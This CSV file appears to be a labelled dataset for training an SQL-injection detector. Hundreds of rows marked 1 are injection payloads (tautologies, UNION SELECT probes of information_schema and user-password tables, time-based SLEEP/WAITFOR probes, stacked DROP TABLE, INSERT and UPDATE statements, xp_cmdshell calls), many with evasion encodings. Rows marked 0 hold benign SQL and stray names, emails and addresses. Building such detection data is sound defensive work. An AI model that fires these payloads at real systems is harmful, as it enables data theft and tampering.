Sentence,Label
t45o0a35,0
des9o89451rac28,0
"1'%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/* OR 1=1## OR 1=1",1
"1'%20AND%20BENCHMARK(5000000,MD5('A'))--/*",1
ADMIN'/*172620849196500,1
""" OR 1=1#----##825--",1
admin'/**/OR/**/1=1-- OR 1=1402847,1
"1"" UNION SELECT NULL----159386",1
"1"" OR ""a""=""a AND 1=1--376--#",1
""" or 2=2--#",1
admin0x27/*58763508 OR 1=1,1
SELECT * FROM practice WHERE discovery = 'over'  OR scared = 'fifty',0
62258107m,0
SELECT TOP 3 * FROM everybody SELECT * FROM treated 3SELECT * FROM river,0
'%20or%201=1--969 OR 1=1 AND 1=142,1
admin1' OR 1 = 1/* AND 1=1#,1
"admin1"" OR ""1"" = ""1--/*737# AND 1=1",1
"1'+UNION+SELECT+NULL,column_name+FROM+information_schema.columns--",1
SELECT AVG ( balloon ) FROM stream,0
10x27; WAITFOR DELAY 0x2700:00:050x27----439,1
""" OR ""1""=""1 AND 1=1 OR 1=144 OR 1=1",1
admin' OR '99'='9945,1
"  SELECT * FROM figure WHERE worker NOT IN  ( 'how', 'eye', 'familiar' )  ",0
10x27; WAITFOR DELAY 0x2700:00:050x27----928 AND 1=1 OR 1=1406404 OR 1=1970,1
SELECT everywhere ( s )  FROM western FULL OUTER JOIN,0
SELECT COUNT ( properly ) FROM establish,0
"1"" UNION SELECT NULL,NULL------611-- OR 1=1696568--",1
1'%20AND%20pg_sleep(5)--636 AND 1=1,1
1' OR 'a'='a544#----,1
telsfora,0
admin') OR 1=1--# AND 1=1/*,1
'%20or%201=1# AND 1=1419,1
SELECT * FROM sky WHERE light BETWEEN '1996-07-01' AND '1996-07-31',0
"calle reina violante, 35,",0
9110,0
SELECT * FROM bee FETCH FIRST 50 PERCENT ROWS ONLY,0
3290000000000000,0
')/**/OR/**/1=1--#615,1
SELECT flow FROM beneath UNION SELECT composition FROM shelf ORDER BY clearly,0
user') OR 1=1-- AND 1=1882350 AND 1=1,1
SELECT * FROM entire WHERE chair NOT LIKE 'blanket%',0
"1'+UNION+SELECT+NULL,table_name+FROM+information_schema.tables--#",1
' OR '1'='1-- OR 1=1#,1
1riot_0115a,0
dominguez@comercioenlacalle.hn,0
2' OR 2 = 2--730/*52,1
1'%20AND%20pg_sleep(5)--533872437458988#,1
1%27%3B%20DROP%20TABLE%20users--/*586 AND 1=1--,1
SELECT * FROM special,0
' OR 1=1#----# AND 1=1646,1
"1'%20AND%20BENCHMARK(5000000,MD5('A'))--700",1
"""; UPDATE USERS SET PASSWORD=""HACKED""--69164 OR 1=1#346",1
SELECT TOP 3 * FROM hand SELECT * FROM writer 3SELECT * FROM seeing,0
2' AND SLEEP(5)--76181697 OR 1=1,1
""" OR 1=1/*--929888981",1
"user"" UNION SELECT NULL,NULL--/*958#",1
"""%20UNION%20ALL%20SELECT%20NULL--27487",1
kalpak,0
'/**/OR/**/1=1-- OR 1=1876-- AND 1=1769,1
" SELECT FIELD ( ""c"", ""a"", ""b"" ) ; ",0
test' UNION SELECT NULL-- AND 1=1 AND 1=1,1
"admin"" UNION SELECT NULL,NULL,NULL--/*517 AND 1=1594--124920",1
'+OR+1=1#/*# AND 1=1/*#/*/*,1
1%27%20AND%20BENCHMARK%285000000%2CMD5%28%27A%27%29%29----765,1
"  SELECT story,run,dot FROM difficult LEFT JOIN Orders ON refer.arrangeID =  dug.master ORDER BY curve.instance",0
admin'%20OR%20'1'='1 AND 1=1,1
1680,0
SELECT * FROM verb WHERE attention = 'train',0
"99"" OR 99 = 99 OR 1=1# OR 1=1928",1
"1"" UNION SELECT NULL,NULL,NULL--14992723",1
1'%09AND%09pg_sleep(5)--860 OR 1=1258--543,1
SELECT * FROM year WHERE Price NOT BETWEEN 10 AND 20,0
"""/**/or/**/1=1/*75",1
"admin"" OR ""1""=""1"" ----/*",1
admin') OR 1=1----774#,1
SELECT * FROM nation FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM basket,0
"1"" OR ""1""=""1"" --/*#987",1
SELECT wp_posts.* FROM wp_posts WHERE 1 = 1 AND wp_posts.post_parent  =  367537 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish' OR wp_posts.post_status  =  'trash'  )  )   ORDER BY wp_posts.menu_order ASC,0
"user"") OR 1=1-- AND 1=1/* OR 1=1583",1
SELECT musical FROM topic,0
SELECT option_value FROM wp_options WHERE option_name  =  'options_cell_number' LIMIT 1,0
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1189 OR 1=1 AND 1=1290 AND 1=1",1
"user' UNION SELECT NULL,NULL,NULL--805 OR 1=1 AND 1=1--",1
SELECT support ( s )  FROM new FULL OUTER JOIN,0
"user' UNION SELECT NULL,NULL--#530",1
ADMIN'/* AND 1=1--# AND 1=1,1
useradmin' OR 1=1---- AND 1=1,1
SELECT COUNT ( improve )  FROM control,0
"1"" UNION SELECT NULL,NULL------611-- OR 1=1696",1
"calle llorente, 73,",0
SELECT MIN ( hot )  AS sum FROM shoe,0
SELECT TOP 50 PERCENT * FROM perfect,0
"""/**/OR/**/1=1-- OR 1=1/*857 AND 1=1 AND 1=1845",1
test' OR 1=1##/* OR 1=1--/*/*,1
"test1"" OR ""1"" = ""1/*#63257751963",1
15317,0
" SELECT * FROM jump ORDER BY little ASC, make DESC",0
SELECT * FROM wp_posts WHERE ID  =  262335 LIMIT 1,0
admin' OR 1=1--# OR 1=1 AND 1=1912,1
%27%20UNION%20SELECT%20NULL--529,1
""" OR 1=1#--846",1
SELECT TOP 3 * FROM round,0
SELECT COUNT ( slept ) FROM visit,0
user') OR 1=1-- AND 1=1325 AND 1=167#643 OR 1=1,1
"admin"") OR (""1""=""1# OR 1=1601 AND 1=1672",1
DELETE FROM thought WHERE black = 'declared',0
SELECT your ( s )  FROM onto FULL OUTER JOIN,0
"'%20UNION%20SELECT%20NULL,NULL,NULL----#712 AND 1=1/*",1
51780892a,0
99' OR 99 = 99 OR 1=1643,1
40531,0
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311# OR 1=1#927 AND 1=1851605",1
test1' OR '1' = '1 AND 1=1#,1
"user"") OR (""1""=""128 AND 1=1 OR 1=1/*",1
"INSERT INTO stay  ( caught, mainly, find )  VALUES  ( 'model', 'mean', 'giving' )  ",0
"admin"" OR ""1""=""1"" /* AND 1=1452900178/*",1
SELECT * FROM moving ORDER BY finger DESC,0
SELECT * FROM question WHERE car = 'yard' FETCH FIRST 3 ROWS ONLY,0
' UNION SELECT NULL--/*622/*427/*25640440 OR 1=1,1
"testadmin"" OR 1=1-- AND 1=1 AND 1=1 OR 1=1",1
10x27; WAITFOR DELAY 0x2700:00:050x27-- AND 1=1728146350,1
"useradmin"" OR ""1""=""1-- OR 1=1125 AND 1=1",1
SELECT AVG ( pie ) FROM value,0
'/**/OR/**/'a'='a922980622971/*580,1
casas de miravete,0
"user"" UNION SELECT NULL,NULL--/* OR 1=1428832",1
ADMIN'/*172620849196533--88,1
"test1' UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=157243",1
1' OR '1'='1' --#57 OR 1=1#332635,1
"test1"" OR ""1"" = ""1/*# AND 1=1--631#",1
SELECT * FROM day WHERE NOT powerful = 'married'  AND NOT stepped = 'plan',0
"""/**/or/**/1=1/*135540 OR 1=1 OR 1=1",1
10x27--,1
3313,0
""" AND extractvalue(1,concat(0x7e,version()))--161/*233 OR 1=1",1
"testadmin"" OR 1=1-- AND 1=1 AND 1=1 AND 1=1",1
'+OR+'1'='1'+/* AND 1=1,1
"1"" OR ""1""=""1/* AND 1=1 OR 1=1/* OR 1=165966",1
admin' OR 1=1/*982,1
SELECT thing ( s )  FROM exact LEFT JOIN,0
"test' UNION SELECT 1,2,3-- OR 1=198692",1
'+OR+1=1#/*160 OR 1=1,1
SELECT park FROM divide,0
band@casadedurcal.bi,0
"1""+OR+1+=+1351888387 OR 1=1 AND 1=1",1
%2527%2520UNION%2520SELECT%25201%252C2%252C3--614653,1
admin' OR 2=2--925348#,1
""" OR 1=1#----## AND 1=1913",1
"""+OR+""1""=""1--959 OR 1=1--",1
"admin1"" OR ""1"" = ""1# OR 1=1538218688",1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/* OR 1=1## OR 1=1679",1
user' OR 1=1# AND 1=1 AND 1=1/*,1
"   SELECT slipped, sister, street FROM exactly WHERE blood  IS NULL",0
SELECT * FROM bread ORDER BY temperature DESC,0
"""+or+1=1# OR 1=1 AND 1=1 OR 1=1",1
silvina,0
user' OR 1=1/*/*--732,1
testadmin' OR '1'='1 AND 1=1613 AND 1=1,1
admin' UNION ALL SELECT NULL-- AND 1=1607,1
SELECT * FROM birds  WHERE sum = substance,0
""" OR 1=1/*--929888175",1
%27%20AND%201%3DCONVERT%28int%2C%28SELECT%20%40%40version%29%29--184611,1
"admin1"" OR ""1"" = ""1# OR 1=1538711",1
"c/ amador de los rios, 131, 1?g",0
useradmin' OR '1'='1--/*467 AND 1=1,1
useradmin' OR 1=1--#/*60666382,1
ptok@aou.com.th,0
8349,0
admin'#640--,1
"test"" UNION SELECT NULL,NULL--/* AND 1=1/*/*/*",1
"""%09or%091=1# AND 1=1 OR 1=1691449626985/*",1
test' UNION ALL SELECT NULL--954683629,1
1' OR '1'='1' --#57/*14632511,1
"1"";%20WAITFOR%20DELAY%20""00:00:05""--148",1
'/**/OR/**/1=1-- OR 1=1 AND 1=1 OR 1=1 OR 1=1882,1
'/**/OR/**/'1'='1'/**//* AND 1=1,1
"1""; INSERT INTO users VALUES(""hacked"",""pass"")--739--353#253",1
"INSERT INTO attack ( fierce, manufacturing, tree, settlers, built, magnet )  VALUES  ( 'condition', 'journey'. difficult', 'gather', 'equator', 'shade', 'giant' )  ",0
"test1"" OR ""1"" = ""1 AND 1=152",1
admin' OR 1=1#/*120637/*#--,1
"""%20or%201=1/*835 OR 1=1 OR 1=1137",1
1%27%20AND%20BENCHMARK%285000000%2CMD5%28%27A%27%29%29-- AND 1=1404,1
SELECT * FROM box WHERE NOT call = 'whatever'  AND NOT process = 'choose',0
"  SELECT mileID AS ID, limited AS come FROM wish",0
" SELECT * FROM alone ORDER BY mind, two",0
1' OR '1'='1' --#57/*#,1
SELECT waste ( s )  FROM direct SELECT putting ( s ) ,0
1%27-- AND 1=1386,1
SELECT * FROM hello WHERE first NOT BETWEEN 'sleep' AND 'breathing',0
SELECT TOP 50 PERCENT * FROM difficult,0
"' UNION SELECT NULL,NULL,NULL--241/*",1
admin' OR '1'='1' /*107#,1
SELECT AVG ( join ) FROM rocky,0
74725623a,0
"ADMIN""/*172247/*309/*",1
"""%20or%201=1/*180",1
"1"" OR ""1""=""1/* AND 1=1 OR 1=1/* OR 1=1659--282 AND 1=1",1
"admin"" UNION SELECT 1,2,3-- AND 1=1957725837/*",1
SELECT * FROM storm WHERE damage = 'married'  OR cattle = 'pipe',0
"99'; INSERT INTO users VALUES('hacked','pass')--372816#--413#",1
user') OR 1=1-- AND 1=1882350307# OR 1=185#,1
') OR ('1'='1/*--384389,1
loudiadi,0
"""%20or%201=1/*835/*#442--",1
"vallbona, 72 3?b",0
fauno,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 173 )  ORDER BY meta_id ASC",0
SELECT * FROM  ( SELECT say FROM fire ) ,0
11' OR 1 = 1/*579,1
SELECT * FROM fill FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM slowly ORDER BY remove DESC,0
"""/**/OR/**/1=1-- OR 1=1 AND 1=1/*",1
"user"" UNION SELECT NULL--/*844#",1
"""/**/OR/**/""a""=""a827/*",1
"' AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953--#/*",1
38821598j,0
10x27; WAITFOR DELAY 0x2700:00:050x27-- AND 1=1 AND 1=143585497703,1
"admin' UNION SELECT NULL,NULL--897514154 OR 1=1 OR 1=1 OR 1=1",1
admin' OR '1'='1 AND 1=1998957,1
' OR '1'='1' --/* AND 1=172,1
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367535 ) ,0
newtell@theroxyblue.ir,0
regazo,0
"' AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953--# OR 1=1740 OR 1=1",1
""" OR 1=1#-- OR 1=1#805 OR 1=1",1
"test1"" OR ""1"" = ""1/*# AND 1=1--25#",1
user') OR 1=1-- AND 1=1325 AND 1=167817#,1
1'%09OR%09'1'%09=%09'1998/* OR 1=1 AND 1=1,1
kavid,0
paley,0
'+OR+1=1#/*# AND 1=1/*#/*875,1
"1""%09UNION%09SELECT%09NULL,column_name%09FROM%09information_schema.columns--",1
'+or+1=1##,1
incisivo,0
"""%20or%201=1--969 OR 1=1 OR 1=1",1
admin' OR '99'='99 OR 1=1882,1
"   SELECT COUNT ( what ) , everybody FROM lot BY meant",0
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))--761--/*##794/*",1
"admin"" OR 1=1--/* OR 1=1--/* OR 1=1",1
SELECT AVG ( map ) FROM forward,0
10x27; WAITFOR DELAY 0x2700:00:050x27----928 AND 1=1/*,1
"admin' UNION SELECT 1,2,3-- AND 1=1 OR 1=1",1
"user' UNION SELECT NULL,NULL--# OR 1=1/*655428109",1
1'------ AND 1=1,1
2' AND SLEEP(5)--761163 AND 1=1,1
%27%29%20OR%20%28%271%27%3D%271 AND 1=1956684,1
SELECT interest ( s )  FROM still,0
"admin"" OR ""1""=""1 AND 1=1998-- AND 1=1394",1
roquemore@veocime.bu,0
test' OR '1'='1/*,1
SELECT AVG ( Price ) FROM fair,0
"test' UNION SELECT 1,2,3-- AND 1=1512#",1
test' OR 1=1#/*#875421,1
%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--#452,1
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))--761--/*##794 AND 1=134840 AND 1=1",1
1'; WAITFOR DELAY '00:00:010'--866/*#,1
"1"" OR ""1"" = ""1 AND 1=1566 OR 1=1 OR 1=133",1
1'%20OR%20'1'%20=%20'1918/*,1
""") OR (""1""=""1/* OR 1=1--326 AND 1=1",1
"1"" UNION SELECT NULL----15926",1
"test' UNION SELECT 1,2,3-- AND 1=1512 AND 1=197823",1
user' UNION ALL SELECT NULL----/*#,1
"'%20UNION%20SELECT%20NULL,NULL,NULL----#712--",1
user') OR 1=1-- AND 1=188235030750305,1
"""/**/OR/**/1=1-- OR 1=1/*857470924465",1
SELECT * FROM case ORDER BY somebody DESC,0
"admin' UNION SELECT username,password FROM users-- AND 1=1 OR 1=1 AND 1=160827--485",1
1' UNION SELECT NULL----395225,1
"11' UNION SELECT NULL,table_name FROM information_schema.tables--/*--/*481477642",1
"1"" OR ""1""=""1/*",1
"1' UNION SELECT 1,2,3--/*--",1
"admin"" UNION SELECT NULL-- AND 1=194",1
"calle palmito, s/n, 12?g",0
"user"") OR (""1""=""128 AND 1=1501",1
23611,0
lora@rocofer.jobs,0
"  SELECT deal,college FROM everybody WHERE active = 'mirror' UNION SELECT cloth, scared FROM indicate",0
' UNION ALL SELECT NULL--#/*#,1
"""%20or%201=1# AND 1=1386",1
contreras,0
user' OR 1=1-- AND 1=1,1
SELECT COUNT ( method )  FROM fort,0
SELECT AVG ( but ) FROM improve SELECT SUM ( cross ) ,0
' OR 1=1#-- OR 1=1#980,1
"1""----101-- AND 1=1#",1
user' OR '1'='1#315-- AND 1=1/*684304,1
' UNION SELECT NULL--/*622/*427/*515146677,1
SELECT * FROM trap,0
0x27; UPDATE users SET password=0x27hacked0x27--447 AND 1=1,1
"2"" OR ""2"" = ""2163254#/*97#848",1
3880000000000000,0
SELECT option_value FROM wp_options WHERE option_name  =  'kc_tkl_cc' LIMIT 1,0
""" AND extractvalue(1,concat(0x7e,version()))--161/*788318300 OR 1=1",1
antonio ulloa 6 6?d,0
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1 OR 1=1 OR 1=1",1
"99""; INSERT INTO users VALUES(""hacked"",""pass"")-- OR 1=1210784 OR 1=1/*/* OR 1=1/*",1
4560,0
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1838385",1
useradmin' OR 1=1--# AND 1=1719,1
SELECT * FROM pair WHERE your = 'corn' FETCH FIRST 3 ROWS ONLY,0
 UPDATE seems SET some = 'flag'WHERE son = 'distant',0
"   SELECT Employees.smaller, COUNT ( Orders.noneID )  AS everybodyFROM    ( OrdersINNER JOIN house ON Orders.degreeID  =  Employees.warnID ) ",0
'/**/OR/**/1=1-- OR 1=1 AND 1=1 OR 1=1 OR 1=122,1
"test1' UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=157437 OR 1=1128",1
SELECT TOP 3 * FROM tobacco,0
"1'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1 AND 1=1 OR 1=1-- AND 1=1",1
"   SELECT Employees.remarkable, COUNT ( Orders.somehowID )  AS biggerFROM    ( OrdersINNER JOIN realize ON Orders.southID  =  Employees.baseballID ) ",0
"  SELECT floating,travel FROM sand WHERE feed = 'quickly' UNION SELECT shinning, me FROM declared",0
SELECT eager FROM has UNION SELECT were FROM gas ORDER BY around,0
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1189 OR 1=1 AND 1=1/*608",1
"testadmin"" OR 1=1-- AND 1=1 AND 1=1",1
1' OR 1=1#/*/*--,1
"' AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953--# OR 1=184",1
"""%20or%201=1# AND 1=1286/*",1
SELECT COUNT ( must )  FROM local,0
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1 OR 1=1 OR 1=1370 OR 1=1 AND 1=1",1
"1"" OR ""1""=""1/* AND 1=1 OR 1=1/* OR 1=1659--282466",1
DELETE FROM species WHERE monkey = 'somewhere',0
"testadmin"" OR 1=1-- AND 1=1 AND 1=1497#",1
alvarez 35,0
'%09UNION%09ALL%09SELECT%09NULL--47776,1
user' OR 1=1--/* OR 1=178611304,1
"useradmin"" OR 1=1--#572/*-- OR 1=1515",1
96622444l,0
"user"" OR 1=1/* AND 1=1--",1
SELECT * FROM long WHERE examine = 'log',0
user' OR 1=1--/* OR 1=1#454,1
' OR '2'='213973 AND 1=1 OR 1=1 OR 1=1,1
SELECT * FROM buffalo WHERE copy IN  ( SELECT maybe FROM division ) ,0
"""+OR+""1""=""1--7759213",1
"admin""/**/OR/**/1=1-- OR 1=1 OR 1=1756/*-- AND 1=1 AND 1=1500",1
"test1"" OR ""1"" = ""1/*# AND 1=1--631811",1
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))-- OR 1=132132",1
' OR 'a'='a839886,1
"adminadmin"" OR ""1""=""1/* OR 1=1504",1
"user"") OR 1=1-- AND 1=1882350307465594",1
"admin"" UNION SELECT NULL,NULL--897514154 OR 1=1 OR 1=1/*357",1
"admin"" OR 1=1-- OR 1=1 AND 1=1 AND 1=1#--",1
"1""+UNION+SELECT+NULL,table_name+FROM+information_schema.tables-- AND 1=1 AND 1=1--",1
SELECT COUNT ( warnID ) FROM third,0
'/**/OR/**/'1'='1'/**/--/*75#591 AND 1=1113,1
"admin' UNION SELECT NULL,NULL-- AND 1=1381",1
3151,0
user') OR ('1'='1--167387572381,1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1812371/*535",1
SELECT * FROM monkey WHERE NOT total = 'excellent'  AND NOT hundred = 'actual',0
"SELECT column1 , column2, ... FROM table_name ORDER BY column1, column2, ... ASC|DESC;",0
"1'%09UNION%09SELECT%09NULL,column_name%09FROM%09information_schema.columns--600/*465",1
SELECT * FROM walk WHERE sudden LIKE '%serious%',0
"  SELECT planetID AS ID, grew AS knew FROM ranch",0
"1""%20OR%201%20=%201 OR 1=1",1
10380,0
"test' UNION SELECT 1,2,3--/*#974 OR 1=1161",1
""";+EXEC+xp_cmdshell(""dir"")-- AND 1=1 AND 1=1/*286",1
alma,0
"  SELECT Orders.layersrID, Employees.when, Employees.struggle FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.whenID ORDER BY Orders.woolID",0
"""%20or%201=1-- OR 1=1824",1
chuchazo,0
'/**/OR/**/'1'='1'/**/--/*75--,1
1%27%20AND%20BENCHMARK%285000000%2CMD5%28%27A%27%29%29----520/*,1
d2s32bearse,0
' UNION SELECT NULL--/*622/*-- OR 1=1,1
admin') OR 1=1--#964,1
choon,0
' OR '99'='99' --526,1
SELECT AVG ( western ) FROM main SELECT SUM ( orange ) ,0
""")+OR+(""1""=""1 AND 1=1875237",1
test' OR 1=1##/* OR 1=114,1
' or 1=1--73#91,1
SELECT * FROM making WHERE him  BETWEEN 10 AND 20,0
""" OR ""2""=""213 AND 1=1/*26740",1
""" UNION ALL SELECT NULL--/* AND 1=1964777/*",1
1' OR '1'='1/* AND 1=1 OR 1=1106984,1
SELECT TOP 3 * FROM pull SELECT * FROM discover 3SELECT * FROM canal,0
""";+EXEC+xp_cmdshell(""dir"")-- AND 1=1--247810 OR 1=1",1
5257930000000000,0
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--138/*-- AND 1=1 OR 1=1105",1
"test"") OR 1=1--/* OR 1=1213",1
1'/**/AND/**/pg_sleep(5)--148,1
SELECT * FROM pictured WHERE nuts IN  ( SELECT slept FROM over ) ,0
"1""%20OR%201%20=%201575409900",1
';%20EXEC%20xp_cmdshell('dir')--591 AND 1=1815,1
"99""; INSERT INTO users VALUES(""hacked"",""pass"")-- OR 1=1210784 OR 1=1/*/*67080",1
14977979b,0
567192000000000,0
 UPDATE flame SET wish = 'mouth'WHERE lovely = 'cave',0
"paraje antonio de nebrija 39,",0
"calle isis, 180",0
SELECT season FROM book UNION SELECT out FROM pattern ORDER BY naturally,0
admin' UNION SELECT NULL-- AND 1=1#645/*735115,1
"admin' UNION SELECT NULL,NULL--897514208",1
"admin' UNION SELECT username,password FROM users-- AND 1=1/*772",1
"1"" UNION SELECT NULL,NULL------611-- OR 1=1--",1
1'; WAITFOR DELAY '00:00:010'--866 AND 1=1,1
"user"" UNION SELECT NULL--/*844798",1
' OR 1=1#----# AND 1=1--# AND 1=1378 OR 1=1,1
kavaler,0
1' OR '1'='1' --#57/*146644,1
eliseo,0
8641510000000000,0
SELECT DISTINCT duty FROM damage,0
sempronia,0
SELECT TOP 50 PERCENT * FROM finger,0
"""/**/OR/**/1=1-- OR 1=1/*857470924140653",1
SELECT AVG ( lower )  FROM lunch  SELECT SUM ( time ) ,0
user' OR 1=1/*/* AND 1=1/*613,1
SELECT COUNT ( machinery ) FROM unknown,0
""";+EXEC+xp_cmdshell(""dir"")-- AND 1=1 AND 1=1/*374/*",1
""" UNION SELECT 1,2,3--/*#973",1
"1'; INSERT INTO users VALUES('hacked','pass')--739# AND 1=1651#",1
9728,0
emil,0
admin' UNION SELECT NULL-- AND 1=1#645/*735 AND 1=1/*476 AND 1=1,1
' or 2=2/* AND 1=1/*/*,1
"1"" OR ""1"" = ""1--365# AND 1=1",1
talonera,0
d6ntrotr566,0
DELETE FROM please,0
8ap6l4984,0
' OR '2'='213/*997,1
SELECT * FROM wp_posts WHERE ID  =  28620 LIMIT 1,0
"""/**/UNION/**/SELECT/**/NULL,NULL,NULL--306587/*",1
86168713h,0
faada,0
"   SELECT farm, worried, builtFROM magic WHERE team  IS NOT NULL",0
"admin' UNION SELECT username,password FROM users-- AND 1=1 OR 1=1 AND 1=160827--485708",1
gilden@gopersonalfitness.ua,0
' or 2=2/*##,1
"admin' UNION SELECT NULL,NULL--897514154 OR 1=1 OR 1=1833144",1
"1"" AND BENCHMARK(5000000,MD5(""A""))--379",1
SELECT * FROM thee WHERE feet = 'cabin' FETCH FIRST 3 ROWS ONLY,0
22373,0
isaciar,0
95868852e,0
SELECT * FROM differ WHERE breeze = 'another'  AND City = 'detail',0
""" OR 1=1#-- OR 1=1#805754",1
1'%09AND%09pg_sleep(5)--860513 OR 1=1723/*473,1
"' UNION SELECT 1,2,3--/*#71",1
"testadmin"" OR 1=1-- AND 1=1 AND 1=149731",1
8ienne2s6,0
inocencio,0
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--138/*-- AND 1=1445",1
"testadmin"" OR 1=1-- AND 1=1 AND 1=1437",1
"1'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1 AND 1=1 OR 1=1 AND 1=1348--547",1
"  SELECT own AS coming, lady AS [bend]  FROM letter",0
test' OR 1=1#/*#889,1
1' OR '1' = '1 AND 1=1 OR 1=1/*650,1
SELECT * FROM sat WHERE finest = 'satisfied' FETCH FIRST 3 ROWS ONLY,0
' UNION SELECT NULL--/*622/*427/*25640440370,1
90660924f,0
arroldo,0
') OR ('1'='1/* OR 1=1--/*248182674,1
"test"" UNION SELECT NULL,NULL--/* AND 1=1/*/*249",1
"""+OR+1=1----966678",1
salhany0,0
admin' UNION ALL SELECT NULL--24261,1
"INSERT INTO gold ( twice, else, post, direct, favorite, wear )  VALUES  ( 'shelf', 'sum'. bent', 'merely', 'struggle', 'great', 'longer' )  ",0
"""%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=1828",1
SELECT farm FROM back UNION SELECT were FROM band ORDER BY ran,0
"'%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1131249",1
"'%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 AND 1=1",1
"test"" OR 1=1##/*#600",1
""" or 2=2/* AND 1=1# AND 1=1719502",1
"  SELECT * FROM live WHERE image NOT IN  ( 'golden', 'union', 'torn' )  ",0
testadmin' OR '1'='1,1
"""/**/OR/**/1=1-- OR 1=1/*857 AND 1=1 OR 1=1",1
1' OR '1' = '1 AND 1=1566 OR 1=1 OR 1=1#458334,1
%2527%2520UNION%2520SELECT%25201%252C2%252C3--614495962,1
18452,0
10x27; WAITFOR DELAY 0x2700:00:050x27-- AND 1=1728964,1
"admin1"" OR ""1"" = ""1# OR 1=1/*67--129",1
1' OR '1'='1 OR 1=1 AND 1=1579--,1
cado,0
b3r3al,0
'+OR+1=1#/*# AND 1=1/*#/*/* OR 1=1 OR 1=1#,1
vilma,0
admin' OR 2=2----,1
vahid,0
"test' UNION SELECT 1,2,3--273513",1
"admin1"" OR ""1"" = ""1# AND 1=1#----",1
"1"" UNION SELECT NULL,NULL------611-- OR 1=1696568996",1
iris,0
""" OR 1=1#---- OR 1=1130",1
' or 2=2--#46828799,1
admin' OR '99'='99 OR 1=1713664,1
'/**/or/**/1=1/* AND 1=1 AND 1=1 OR 1=1 AND 1=1,1
SELECT AVG ( recently ) FROM government,0
admin') OR 1=1--# AND 1=1580272,1
sanou bellsol,0
"   SELECT find,stick,maybe,never,fix     (  (  fat JOIN program ON now.interest =  community.shut )   INNER JOIN planningON Orders.gone =  cookies.riseID ) ",0
"test1"" OR ""1"" = ""1/*# AND 1=1--631/*/*800332",1
"1';+INSERT+INTO+users+VALUES('hacked','pass')-- AND 1=1 OR 1=1174 OR 1=1834",1
"'%20UNION%20SELECT%20NULL,NULL,NULL----#712 AND 1=1900--",1
') OR ('1'='1/*--384 OR 1=1,1
user' OR 1=1--/* OR 1=1## OR 1=1,1
"   SELECT wood, hardly+ ', ' + mental+ ' ' + poor+ ', ' + getting AS diagram  FROM vast",0
"1""; INSERT INTO users VALUES(""hacked"",""pass"")--739-- OR 1=1518231720",1
' OR '1'='1' --/* AND 1=1527424,1
"admin"" UNION SELECT NULL,NULL,NULL--/*410--",1
"admin"" UNION SELECT NULL,NULL,NULL--/*517/*",1
%2527%2520OR%25201%253D1/%252A907,1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1 OR 1=1 OR 1=150991755",1
1' OR '1'='1' --/*612 AND 1=1#725623,1
